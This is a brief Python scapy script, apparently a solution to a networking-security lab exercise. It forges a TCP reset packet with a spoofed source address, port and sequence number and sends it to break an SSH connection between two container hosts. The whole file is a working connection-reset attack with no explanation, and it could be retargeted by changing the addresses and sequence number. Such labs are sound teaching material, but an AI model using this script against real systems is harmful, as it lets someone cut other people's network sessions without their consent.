#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=51036, dport=22, flags="R", seq=488613973)
pkt = ip/tcp
ls(pkt)
send(pkt, iface="br-3e5f42528ad9", verbose=0)
